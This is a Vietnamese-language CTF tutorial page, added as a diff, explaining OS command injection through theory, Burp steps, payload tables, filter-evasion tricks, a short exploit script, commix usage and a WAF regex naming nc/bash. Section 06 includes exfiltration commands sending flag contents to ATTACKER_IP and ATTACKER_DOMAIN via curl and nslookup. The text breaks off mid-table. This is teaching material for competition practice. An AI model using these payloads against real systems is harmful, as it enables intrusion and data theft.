@@ -1,0 +1,636 @@
+<title>OS Command Injection — Web CTF</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#ecebe4;--fg:#23211c;--muted:#6b665b;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--danger:#c0392b;--burp:#c2561a;--burp-soft:#f6e2d2;
+  --code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:760px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.62;font-size:16px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:40px 24px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,42px);line-height:1.05;margin:.3em 0 .25em;letter-spacing:-.015em}
+.sub{color:var(--muted);font-size:17px;max-width:62ch}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:16px}
+.toc a{font-family:var(--font-mono);font-size:11px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 8px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(20px,4vw,26px);letter-spacing:-.01em;margin:0 0 2px}
+h3{font-family:var(--font-head);font-weight:600;font-size:16.5px;margin:20px 0 6px}
+section.block{padding-block:28px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:10px 0}strong{font-weight:600}a{color:var(--accent)}
+ul,ol{padding-left:21px;margin:9px 0}li{margin:5px 0}
+code{font-family:var(--font-mono);font-size:.86em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:12.5px;line-height:1.56;padding:14px;border-radius:11px;overflow-x:auto;margin:10px 0}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .n{color:#e8c56a}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13.5px}
+th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--muted)}
+tr:last-child td{border-bottom:none}
+.lead{font-size:17.5px}
+.twolayer{display:flex;flex-direction:column;gap:0;border-radius:14px;overflow:hidden;border:1px solid var(--line);margin:16px 0}
+.layer{padding:14px 16px}
+.layer.combat{background:var(--accent-soft);border-bottom:2px dashed var(--accent)}
+.layer.deep{background:var(--mem-soft)}
+.layer .lh{font-family:var(--font-head);font-weight:700;font-size:15px;display:flex;align-items:center;gap:7px;margin-bottom:3px}
+.layer.combat .lh{color:var(--accent)}.layer.deep .lh{color:var(--mem)}
+.layer p{margin:3px 0 0;font-size:14px}
+.note{border-left:3px solid var(--mem);background:var(--surface);padding:11px 14px;border-radius:0 10px 10px 0;margin:14px 0;font-size:14px}
+.note .tag{font-family:var(--font-mono);font-size:10.5px;text-transform:uppercase;letter-spacing:.09em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.note.tip{border-color:var(--ok)}
+.note.warn{border-color:var(--danger)}
+.note.burp{border-color:var(--burp);background:var(--burp-soft)}
+.note.burp .tag{color:var(--burp)}
+.def{border:1px dashed var(--mem);background:var(--mem-soft);border-radius:10px;padding:10px 13px;margin:10px 0;font-size:13.5px}
+.def b{color:var(--mem)}
+.struct{display:flex;flex-direction:column;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:12px 0}
+.srow{display:grid;grid-template-columns:30px 1fr;gap:10px;padding:10px 13px;background:var(--surface)}
+.srow .n{font-family:var(--font-mono);font-weight:700;color:var(--accent);font-size:13px}
+.srow .t{font-weight:600;font-size:14px}
+.srow .d{font-size:12.5px;color:var(--muted);margin-top:1px}
+.combatcard{border:2px solid var(--accent);border-radius:12px;overflow:hidden;margin:14px 0}
+.combatcard .ch{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:8px 14px;font-size:14px}
+.combatcard .cb{padding:4px 14px 10px}
+.cslot{padding:10px 0;border-bottom:1px solid var(--line);font-size:13.5px}
+.cslot:last-child{border-bottom:none}
+.cslot .lab{font-family:var(--font-mono);font-size:10.5px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;display:block;margin-bottom:4px}
+.pbreak{border:1px solid var(--line);border-radius:11px;overflow:hidden;margin:12px 0}
+.pbreak .ph{background:var(--surface-2);font-family:var(--font-mono);font-size:12.5px;padding:9px 13px;border-bottom:1px solid var(--line);word-break:break-word}
+.pbreak .pb{padding:10px 13px;font-size:13.5px}
+.pbreak .pb .part{margin:6px 0}
+.pbreak .pb .part code{background:var(--accent-soft);color:var(--accent);font-weight:600}
+.pbreak .resp{background:var(--ok-soft);padding:9px 13px;font-size:13px;border-top:1px dashed var(--line)}
+.pbreak .resp b{color:var(--ok)}
+.svgwrap{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:12px;margin:14px 0}
+.svgwrap svg{width:100%;height:auto;display:block}
+details{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:9px 13px;margin:8px 0;font-size:13.5px}
+summary{cursor:pointer;font-weight:600;color:var(--accent)}
+.badge{display:inline-block;font-family:var(--font-mono);font-size:11px;padding:2px 8px;border-radius:999px;font-weight:700}
+.badge.easy{background:var(--ok-soft);color:var(--ok)}
+.badge.med{background:var(--accent-soft);color:var(--accent)}
+.badge.hard{background:color-mix(in srgb,var(--danger) 16%,transparent);color:var(--danger)}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer;opacity:.9}
+footer{padding-block:22px 40px;color:var(--muted);font-size:13px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">Web CTF · Injection phía server</div>
+    <h1>OS Command Injection</h1>
+    <p class="sub">Khi một trang web nhận input của bạn rồi đưa thẳng vào một <strong>lệnh hệ điều hành</strong>
+    (như <code>ping</code>, <code>convert</code> ảnh, <code>nslookup</code>...) — bạn có thể chèn thêm lệnh của
+    riêng mình, khiến <strong>server tự chạy lệnh đó</strong> và trả kết quả (hoặc cho bạn một shell điều khiển
+    trực tiếp máy chủ).</p>
+    <div class="toc">
+      <a href="#combat">⚡ Combat</a><a href="#s00">00 Tóm tắt</a><a href="#s01">01 Nền tảng</a>
+      <a href="#s02">02 Vì sao</a><a href="#s03">03 Cơ chế</a><a href="#s04">04 Nhận diện</a>
+      <a href="#s05">05 Burp</a><a href="#s06">06 Payload</a><a href="#s07">07 Công cụ &amp; CyberChef</a>
+      <a href="#s08">08 Script</a><a href="#s09">09 Ví dụ</a><a href="#s10">10 WAF</a>
+      <a href="#s11">11 Lỗi gặp</a><a href="#s12">12 Giới hạn</a><a href="#s13">13 Bài tập</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s00">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Command Injection là gì, để làm gì?</h2>
+  <p class="lead">Nhiều trang web cần "nhờ" hệ điều hành làm một việc gì đó thay vì tự viết code: kiểm tra mạng bằng
+  <code>ping</code>, đổi định dạng ảnh bằng <code>convert</code>, nén file bằng <code>zip</code>... Để làm việc này,
+  code của server phải <strong>gọi ra một chương trình ngoài</strong> (gọi là "shell command"). Nếu server ghép
+  thẳng input của bạn vào câu lệnh đó mà không kiểm tra, bạn có thể chèn thêm một lệnh khác ngay trong input — và
+  server sẽ chạy luôn lệnh đó, y như bạn đang gõ trực tiếp vào terminal của máy chủ.</p>
+  <div class="note tip"><span class="tag">Nếu chỉ nhớ một điều</span>
+  Đây là lỗ hổng <strong>nguy hiểm nhất</strong> trong các lỗ hổng injection — vì hậu quả thường là
+  <strong>chạy được lệnh bất kỳ trên server</strong> (RCE — Remote Code Execution), không chỉ đọc dữ liệu như SQLi.
+  Ký tự chìa khóa: <code>;</code>, <code>|</code>, <code>&amp;&amp;</code>, và dấu backtick <code>`...`</code> —
+  đây đều là ký tự shell dùng để "nối thêm lệnh" hoặc "chạy lệnh con".</div>
+ </div>
+</section>
+
+<!-- COMBAT CARD -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="secnum">⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay</div>
+  <div class="combatcard">
+    <div class="ch">⚡ OS COMMAND INJECTION</div>
+    <div class="cb">
+      <div class="cslot"><span class="lab">🚩 Nhận ra trong 30 giây</span>
+        Chức năng "có mùi" gọi lệnh hệ thống: ping/traceroute IP, kiểm tra domain, convert/resize ảnh, tạo PDF,
+        export/backup, chạy script người dùng upload. Gõ <code>; id</code> hoặc <code>| whoami</code> vào ô nhập
+        → nếu response xuất hiện thêm output lạ (tên user, uid=...) ⟹ trúng command injection.
+      </div>
+      <div class="cslot"><span class="lab">✅ Tiền đề cần có</span>
+        Tham số đi vào một lệnh shell thật (không phải chỉ validate rồi bỏ). Biết <strong>output lệnh có hiện ra
+        màn hình không</strong> (ăn ngay) hay phải suy luận qua thời gian/hành vi (blind).
+      </div>
+      <div class="cslot"><span class="lab">🔍 Dò nhanh bằng Burp</span>
+        Bắt request → Repeater → thử lần lượt <code>;id</code>, <code>|id</code>, <code>&amp;&amp;id</code>,
+        <code>`id`</code>, <code>$(id)</code> ở tham số nghi ngờ → response nào xuất hiện
+        <code>uid=.../gid=.../groups=...</code> là đúng ký tự phân cách shell đang dùng được.
+      </div>
+      <div class="cslot"><span class="lab">💥 Payload dán-chạy-ngay</span>
+<pre><code><span class="c"># 1. Xác nhận (thử lần lượt từng ký tự phân cách)</span>
+127.0.0.1; id
+127.0.0.1| id
+127.0.0.1 && id
+127.0.0.1 `id`
+127.0.0.1 $(id)
+
+<span class="c"># 2. Không thấy output? Blind qua thời gian</span>
+127.0.0.1; sleep 5
+127.0.0.1 && ping -c 5 127.0.0.1
+
+<span class="c"># 3. Đã xác nhận -> đọc flag thẳng</span>
+127.0.0.1; cat /flag*
+127.0.0.1; find / -iname "flag*" 2>/dev/null</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">🐍 Script khai thác (điền host, chạy)</span>
+<pre><code><span class="k">import</span> re, requests
+html = requests.get(<span class="s">"http://TARGET/ping"</span>,
+        params={<span class="s">"ip"</span>: <span class="s">"127.0.0.1; cat /flag*"</span>}).text
+<span class="k">print</span>(re.search(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>, html).group())</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">⚠️ Gotcha + 🛡️ WAF 1 dòng</span>
+        Bị lọc khoảng trắng → dùng <code>$IFS</code> thay dấu cách. Bị lọc toàn bộ ký tự phân cách → thử biến môi
+        trường mở rộng <code>${PATH:0:1}</code>... (xem mục 06). WAF rule nhanh: chặn regex
+        <code>[;&amp;|`]\s*(cat|id|whoami|ls|nc|bash|sh)\b</code>. Chưa hiểu các bước? đọc tiếp dưới.
+      </div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s01">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Những thứ cần hiểu trước</h2>
+  <div class="def"><b>Shell</b> — chương trình dòng lệnh của hệ điều hành (như <code>bash</code> trên Linux) —
+  nơi bạn gõ lệnh như <code>ls</code>, <code>ping</code>, <code>cat</code> và nó thực thi. Server cũng có thể "gõ
+  hộ" một lệnh vào shell này từ bên trong code của nó.</div>
+  <div class="def"><b>Ký tự phân cách lệnh (shell metacharacter)</b> — những ký tự có <em>ý nghĩa đặc biệt</em>
+  với shell, không phải chữ thường: <code>;</code> (chạy lệnh tiếp theo dù lệnh trước đúng/sai),
+  <code>&amp;&amp;</code> (chạy lệnh tiếp theo <em>chỉ khi</em> lệnh trước thành công), <code>|</code> (đưa output
+  của lệnh trước làm input cho lệnh sau), <code>`lệnh`</code> hoặc <code>$(lệnh)</code> (chạy lệnh con, lấy kết
+  quả của nó chèn vào ngay tại chỗ).</div>
+  <div class="def"><b>RCE (Remote Code Execution)</b> — hậu quả cuối cùng: kẻ tấn công chạy được lệnh tùy ý trên
+  máy chủ từ xa, qua mạng, không cần ngồi trước máy đó.</div>
+  <p>Ví dụ: trang web có chức năng "Kiểm tra kết nối" — bạn nhập IP, server ping thử rồi hiển thị kết quả. Code
+  phía sau (kiểu hay gặp trong challenge) nối chuỗi trực tiếp:</p>
+  <pre><code><span class="c"># Python</span>
+ip = request.args.get(<span class="s">"ip"</span>)
+output = os.popen(<span class="s">f"ping -c 1 {ip}"</span>).read()</code></pre>
+  <p>Lập trình viên định chạy đúng <code>ping -c 1 &lt;IP người dùng nhập&gt;</code>. Nhưng vì <code>ip</code> được
+  dán thẳng vào chuỗi lệnh, bạn có thể biến nó thành <em>hai lệnh</em>.</p>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s02">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO LỖ HỔNG TỒN TẠI</div>
+  <h2>Shell không phân biệt được "dữ liệu" với "lệnh"</h2>
+  <p>Giống hệt vấn đề của SQLi (xem bài <a href="sqli.html">sqli.html</a> nếu đã học) nhưng ở tầng hệ điều hành
+  thay vì database: <strong>shell chỉ đọc một chuỗi ký tự dài và thực thi theo đúng cú pháp của nó</strong>, không
+  biết phần nào server "định" là dữ liệu (IP) và phần nào là lệnh thật.</p>
+  <p>Khi bạn gõ <code>127.0.0.1; id</code> vào ô input, server ghép ra:</p>
+  <pre><code>ping -c 1 127.0.0.1; id</code></pre>
+  <p>Với shell, đây không phải "một lệnh ping với tham số kỳ lạ" — mà là <strong>HAI lệnh riêng biệt</strong> nối
+  bằng dấu <code>;</code>: <code>ping -c 1 127.0.0.1</code> chạy xong, rồi tới lệnh <code>id</code> chạy tiếp,
+  hoàn toàn độc lập. Dấu <code>;</code> trong input của bạn đã "thoát vai" dữ liệu để trở thành cú pháp shell thật.</p>
+ </div>
+</section>
+
+<!-- 03 -->
+<section class="block" id="s03">
+ <div class="wrap">
+  <div class="secnum">03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI</div>
+  <h2>Request độc → shell hiểu thành 2 lệnh → hậu quả</h2>
+  <div class="svgwrap">
+  <svg viewBox="0 0 680 280" xmlns="http://www.w3.org/2000/svg">
+    <style>
+      .lbl{font-family:'JetBrains Mono',monospace;font-size:11px;fill:var(--fg)}
+      .lbl-m{font-family:'JetBrains Mono',monospace;font-size:11px;fill:var(--muted)}
+      .lbl-a{font-family:'JetBrains Mono',monospace;font-size:11px;fill:var(--accent);font-weight:700}
+      .box{fill:var(--surface);stroke:var(--line);stroke-width:1.5}
+      .box-a{fill:var(--accent-soft);stroke:var(--accent);stroke-width:1.5}
+      .arrow{stroke:var(--muted);stroke-width:1.5;fill:none;marker-end:url(#arr2)}
+    </style>
+    <defs>
+      <marker id="arr2" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+        <path d="M0,0 L6,3 L0,6 Z" fill="var(--muted)"/>
+      </marker>
+    </defs>
+    <rect x="10" y="20" width="210" height="60" rx="10" class="box"/>
+    <text x="22" y="40" class="lbl-m">Request bạn gửi:</text>
+    <text x="22" y="58" class="lbl">?ip=127.0.0.1</text>
+    <text x="22" y="72" class="lbl-a">; cat /flag</text>
+
+    <path d="M220,50 H258" class="arrow"/>
+    <rect x="263" y="20" width="200" height="60" rx="10" class="box"/>
+    <text x="275" y="40" class="lbl-m">Server ghép chuỗi:</text>
+    <text x="275" y="58" class="lbl">os.popen(f"ping -c1 </text>
+    <text x="275" y="72" class="lbl-a">{ip}")</text>
+
+    <path d="M463,50 H500" class="arrow"/>
+    <rect x="505" y="20" width="165" height="60" rx="10" class="box-a"/>
+    <text x="517" y="40" class="lbl-m">Shell nhận chuỗi:</text>
+    <text x="517" y="58" class="lbl-a" font-size="9.5">ping -c1 127.0.0.1</text>
+    <text x="517" y="70" class="lbl-a" font-size="9.5">; cat /flag</text>
+
+    <path d="M585,80 V110" class="arrow"/>
+    <rect x="263" y="115" width="200" height="60" rx="10" class="box"/>
+    <text x="275" y="135" class="lbl-m">Shell thấy 2 LỆNH:</text>
+    <text x="275" y="153" class="lbl">① ping -c1 127.0.0.1</text>
+    <text x="275" y="167" class="lbl">② cat /flag (lệnh mới!)</text>
+
+    <path d="M263,145 H220" class="arrow"/>
+    <rect x="10" y="115" width="210" height="60" rx="10" class="box-a"/>
+    <text x="22" y="135" class="lbl-a">Hậu quả:</text>
+    <text x="22" y="153" class="lbl">output của lệnh ②</text>
+    <text x="22" y="167" class="lbl">(nội dung flag) in ra response</text>
+
+    <text x="10" y="220" class="lbl-m">Quy ước màu: </text>
+    <rect x="90" y="208" width="14" height="14" class="box-a"/>
+    <text x="110" y="220" class="lbl-m">= phần bạn (kẻ tấn công) kiểm soát / tạo ra</text>
+  </svg>
+  </div>
+  <p>Ví dụ bằng <strong>payload thật đi hết chuỗi</strong>: service ping trả nguyên văn output ra trang. Bạn gửi
+  <code>ip=127.0.0.1; cat /flag.txt</code>. Server chạy <code>ping -c 1 127.0.0.1; cat /flag.txt</code>. Shell thực
+  thi tuần tự: ping xong (có output "PING 127.0.0.1... 1 packets transmitted..."), sau đó chạy tiếp
+  <code>cat /flag.txt</code> — output của lệnh này (nội dung file flag) được <code>os.popen().read()</code> hứng
+  trọn cùng với output của ping, rồi server in cả cục đó ra trang.</p>
+ </div>
+</section>
+
+<!-- 04 -->
+<section class="block" id="s04">
+ <div class="wrap">
+  <div class="secnum">04 / NHẬN DIỆN KHI GẶP CHALLENGE</div>
+  <h2>Bảng dấu hiệu — thấy gì thì nghi command injection</h2>
+  <table>
+    <tr><th>Dấu hiệu quan sát được</th><th>Ý nghĩa</th></tr>
+    <tr><td>Chức năng ping/traceroute/kiểm tra domain, nhận IP hoặc hostname làm input</td><td>Rất hay gọi lệnh <code>ping</code>/<code>nslookup</code>/<code>dig</code> trực tiếp</td></tr>
+    <tr><td>Upload ảnh rồi có bước "xử lý/resize/convert/optimize"</td><td>Có thể gọi <code>convert</code>/<code>ffmpeg</code>/<code>imagemagick</code> qua shell với tên file do bạn đặt</td></tr>
+    <tr><td>Chức năng export PDF/báo cáo, nén/giải nén file</td><td>Hay gọi <code>wkhtmltopdf</code>/<code>zip</code>/<code>tar</code> qua shell</td></tr>
+    <tr><td>Gõ <code>; id</code> hoặc <code>| whoami</code> → response thêm dòng <code>uid=...</code></td><td>Xác nhận gần như chắc chắn</td></tr>
+    <tr><td>Không thấy output lạ, nhưng response chậm hẳn khi thêm <code>; sleep 5</code></td><td>Blind command injection — lệnh có chạy nhưng output không hiện ra, phải đoán qua thời gian</td></tr>
+  </table>
+  <div class="note"><span class="tag">Cách chọc thử nhanh (Combat Card mục 🚩)</span>
+  Thứ tự thử: <code>; id</code> → <code>| id</code> → <code>&amp;&amp; id</code> → <code>`id`</code> →
+  <code>$(id)</code>. Chỉ cần vài giây là biết có dính và dùng được ký tự phân cách nào.</div>
+ </div>
+</section>
+
+<!-- 05 -->
+<section class="block" id="s05">
+ <div class="wrap">
+  <div class="secnum">05 / KHAI THÁC BẰNG BURP SUITE</div>
+  <h2>Bấm gì (từng bước)</h2>
+  <div class="note burp"><span class="tag">Bước 1 — bắt request</span>
+  <ol style="margin:4px 0 0">
+    <li>Burp → tab <strong>Proxy</strong> → bật <em>Intercept is on</em> → trình duyệt đặt proxy
+    <code>127.0.0.1:8080</code>.</li>
+    <li>Trên web, dùng chức năng ping/kiểm tra bất kỳ với input bình thường (vd <code>8.8.8.8</code>).</li>
+    <li>Request bị giữ lại trong Burp.</li>
+  </ol></div>
+  <div class="note burp"><span class="tag">Bước 2 — Repeater, thử từng ký tự phân cách</span>
+  <ol style="margin:4px 0 0">
+    <li>Chuột phải request → <strong>Send to Repeater</strong>.</li>
+    <li>Sửa giá trị tham số thành <code>8.8.8.8; id</code>, bấm <strong>Send</strong>, đọc Response.</li>
+    <li>Không thấy gì lạ? Sửa lại thành <code>8.8.8.8| id</code>, Send, đọc lại. Lặp cho
+    <code>&amp;&amp;</code>, backtick, <code>$()</code>.</li>
+    <li>Thấy dòng <code>uid=1000(www-data) gid=...</code> xuất hiện trong Response ⟹ đúng ký tự đó dùng được, server
+    là Linux, chạy với quyền user <code>www-data</code>.</li>
+  </ol></div>
+  <div class="note burp"><span class="tag">Khi nào cần Intruder</span>
+  Dùng Intruder để <strong>thử hàng loạt ký tự phân cách + lệnh dò</strong> tự động thay vì gõ tay từng cái:
+  đánh dấu vị trí <code>§8.8.8.8§</code>, nạp payload list gồm
+  <code>; id</code>/<code>| id</code>/<code>&amp;&amp; id</code>/<code>`id`</code>/<code>$(id)</code>/<code>%0a id</code>,
+  Start attack, lọc theo cột <strong>Length</strong> — dòng dài hơn hẳn (có thêm output <code>uid=...</code>) là
+  payload trúng.</div>
+ </div>
+</section>
+
+<!-- 06 -->
+<section class="block" id="s06">
+ <div class="wrap">
+  <div class="secnum">06 / PAYLOAD ĐẦY ĐỦ THEO BIẾN THỂ</div>
+  <h2>Chọn đúng kỹ thuật theo tình huống</h2>
+
+  <h3>A. Output hiện trực tiếp <span class="badge easy">dễ nhất, thử trước</span></h3>
+  <table>
+    <tr><th>Ký tự</th><th>Payload ví dụ</th><th>Ghi chú</th></tr>
+    <tr><td><code>;</code></td><td><code>127.0.0.1; cat /flag.txt</code></td><td>Luôn chạy lệnh sau, bất kể lệnh trước đúng/sai. Chỉ có trên Linux shell thật (không có trên Windows <code>cmd</code> mặc định, dùng <code>&amp;</code> thay)</td></tr>
+    <tr><td><code>&amp;&amp;</code></td><td><code>127.0.0.1 && cat /flag.txt</code></td><td>Chỉ chạy lệnh sau nếu lệnh trước <strong>thành công</strong> (exit code 0) — cả Linux/Windows đều hiểu</td></tr>
+    <tr><td><code>|</code></td><td><code>127.0.0.1 | cat /flag.txt</code></td><td>Output lệnh trước thành input lệnh sau — không quan tâm lệnh trước đúng/sai</td></tr>
+    <tr><td>Backtick</td><td><code>`cat /flag.txt`</code></td><td>Chạy lệnh con, kết quả thế chỗ ngay trong dòng — hữu ích khi không có khoảng trắng để tách 2 lệnh</td></tr>
+    <tr><td><code>$()</code></td><td><code>$(cat /flag.txt)</code></td><td>Tương tự backtick, cú pháp mới hơn, dễ đọc hơn khi lồng nhiều lớp</td></tr>
+    <tr><td>Newline</td><td><code>127.0.0.1%0a cat /flag.txt</code></td><td>Trong URL, <code>%0a</code> là ký tự xuống dòng — nhiều shell coi xuống dòng như dấu <code>;</code></td></tr>
+  </table>
+
+  <h3>B. Blind (output không hiện) <span class="badge med">khi không thấy gì khác lạ</span></h3>
+  <pre><code><span class="c"># Dùng sleep để xác nhận lệnh có chạy không, qua thời gian phản hồi</span>
+127.0.0.1; sleep 5
+127.0.0.1 && sleep 5
+127.0.0.1 || sleep 5   <span class="c"># chạy khi lệnh trước THẤT BẠI</span>
+
+<span class="c"># Exfiltrate qua DNS/HTTP callback (khi server có Internet nội bộ ra ngoài, hoặc tới máy bạn trong mạng thi)</span>
+127.0.0.1; curl http://ATTACKER_IP/$(cat /flag.txt | base64)
+127.0.0.1; nslookup $(cat /flag.txt | head -c 30).ATTACKER_DOMAIN</code></pre>
+  <div class="note">Trong A/D thường <strong>không có Internet ra ngoài</strong> — exfil qua curl/nslookup chỉ dùng
+  được nếu listener của bạn nằm <strong>trong mạng thi đấu</strong> (cùng VLAN với service). Ưu tiên thử output
+  trực tiếp hoặc time-based trước.</div>
+
+  <h3>Vượt bộ lọc cơ bản (khi payload chuẩn bị bị chặn)</h3>
+  <table>
+    <tr><th>Bộ lọc gặp phải</th><th>Cách né</th></tr>
+    <tr><td>Chặn khoảng trắng</td><td>Dùng <code>${IFS}</code> hoặc <code>$IFS$9</code> thay dấu cách: <code>cat${IFS}/flag.txt</code>. Hoặc dùng tab <code>%09</code>.</td></tr>
+    <tr><td>Chặn chữ cái trong tên lệnh (blacklist từ khóa <code>cat</code>, <code>ls</code>...)</td><td>Ghép chuỗi rỗng để phá vỡ pattern: <code>c''at</code>, <code>c"a"t</code>, hoặc dùng biến: <code>a=c;b=at;$a$b /flag</code></td></tr>
+    <tr><td>Chặn toàn bộ ký tự phân cách <code>;|&amp;</code></td><td>Dùng wildcard đường dẫn: <code>/???/c?t /fl?g*</code> (shell tự giãn thành <code>/bin/cat /flag.txt</code> nếu khớp đúng số ký tự)</td></tr>
+    <tr><td>Chặn số/tên file cụ thể</td><td>Dùng biến môi trường để tạo ký tự: <code>${PATH:0:1}</code> thường ra <code>/</code></td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 07 -->
+<section class="block" id="s07">
+ <div class="wrap">
+  <div class="secnum">07 / CÔNG CỤ THỰC CHIẾN: COMMIX, CYBERCHEF &amp; KHO PAYLOAD</div>
+  <h2>Không nhớ nổi payload? Dùng công cụ thay vì dò tay</h2>
+
+  <h3>A. Kho payload offline — PayloadsAllTheThings</h3>
+  <p>Có sẵn tại <code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/Command Injection/</code>. Mở thư mục <code>Intruder/</code>
+  bên trong để lấy wordlist nạp thẳng vào Burp Intruder (mục 05) thay vì tự nghĩ danh sách payload.</p>
+
+  <h3>B. commix — tự động dò và khai thác (tương đương sqlmap)</h3>
+  <div class="def"><b>commix</b> — công cụ tự động: đưa nó 1 request, nó tự thử hàng chục kiểu ký tự phân cách +
+  kỹ thuật blind/time-based, tự tìm payload nào vượt được bộ lọc, rồi có thể cho bạn một <strong>pseudo-shell</strong>
+  (gõ lệnh trực tiếp, commix tự gói payload đúng). Đã tải sẵn tại <code>~/hoc/CTF/Tools/web/commix/</code> (clone từ
+  <code>commixproject/commix</code> chính chủ — <strong>cảnh báo:</strong> gói <code>commix</code> trên PyPI là
+  hàng giả mạo, không cài qua <code>pip install commix</code>).</p>
+  <div class="note warn"><span class="tag">Trước khi dùng</span>commix là công cụ khai thác thật, tự gửi nhiều
+  request thử nghiệm tới mục tiêu — <strong>chỉ chạy nhắm vào service do BTC cấp trong giờ thi</strong>, không
+  chạy thử vào domain/IP ngoài phạm vi cho phép.</div>
+  <div class="note burp"><span class="tag">Cách dùng — lấy request từ Burp</span>
+  <ol style="margin:4px 0 0">
+    <li>Trong Burp (đã bắt request ở mục 05), chuột phải → <strong>Save item</strong> → lưu thành
+    <code>req.txt</code>.</li>
+    <li>Chạy:</li>
+  </ol>
+<pre><code>cd ~/hoc/CTF/Tools/web/commix
+python3 commix.py -r req.txt --batch
+
+<span class="c"># chỉ định đúng tham số nghi ngờ nếu request có nhiều tham số</span>
+python3 commix.py -r req.txt -p ip --batch
+
+<span class="c"># đã xác nhận dính -> mở shell tương tác luôn</span>
+python3 commix.py -r req.txt --batch --os-cmd=<span class="s">"cat /flag.txt"</span>
+python3 commix.py -r req.txt --batch --os-shell   <span class="c"># gõ lệnh trực tiếp, commix tự gói payload</span></code></pre>
+  </div>
+  <table>
+    <tr><th>Flag</th><th>Ý nghĩa</th></tr>
+    <tr><td><code>-r req.txt</code></td><td>Đọc request đã lưu từ Burp (giống sqlmap)</td></tr>
+    <tr><td><code>--batch</code></td><td>Không hỏi tương tác, tự chọn mặc định — bắt buộc khi muốn chạy nhanh</td></tr>
+    <tr><td><code>-p THAM_SO</code></td><td>Chỉ định đúng tham số nghi ngờ</td></tr>
